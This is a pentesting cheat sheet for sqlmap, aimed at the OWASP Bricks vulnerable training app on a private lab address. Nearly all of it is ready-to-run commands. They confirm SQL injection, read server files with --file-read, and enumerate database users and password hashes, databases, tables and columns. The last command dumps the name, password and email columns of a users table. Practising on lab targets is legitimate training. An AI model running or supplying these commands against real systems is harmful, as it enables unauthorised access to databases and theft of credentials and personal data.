# SQLmap Enumeration

## Attacking SQLi using SQLmap

For attack follow the subsection [SQLmap attack examples](sqlmap-exploitation.md)

### Successful SQLi confirmation

* say the attack string is
  * `sqlmap -u http://192.168.56.103/owaspbricks/login-1/ --forms --banner --random-agent`

![](../../.gitbook/assets/image%20%28130%29.png)

* If we have this above SQLi payload, then we could start enumerating the database. The SQLi payload is automatically stored and automatically associated with the target machine.

## SQLmap Read OS files

* Fetch any OS files given read permission
  * sqlmap -u [http://192.168.56.103/owaspbricks/login-1/](http://192.168.56.103/owaspbricks/login-1/) --file-read=/var/www/html/administrat/panel.php

## SQLmap database enumeration

* List all database users
  * `sqlmap -u http://192.168.56.103/owaspbricks/login-1/ --forms --banner --random-agent --users`
* List all passwords for these database users
  * `sqlmap -u http://192.168.56.103/owaspbricks/login-1/ --forms --banner --random-agent --users --passwords`
* List all databases present in SQL server
  * `sqlmap -u http://192.168.56.103/owaspbricks/login-1/ --forms --banner --random-agent --dbs`
* List all tables present in a database named "bricks" 
  * `sqlmap -u http://192.168.56.103/owaspbricks/login-1/ --forms --banner --random-agent -D bricks --tables`
* List all the columns present in a specific table "users" in a database "bricks"
  * `sqlmap -u http://192.168.56.103/owaspbricks/login-1/ --forms --banner --random-agent -D bricks -T users --columns`
* Print contents of a table with only specific column
  * `sqlmap -u http://192.168.56.103/owaspbricks/login-1/ --forms --banner --random-agent -D bricks -T users -C name,password,email --dump`

## 

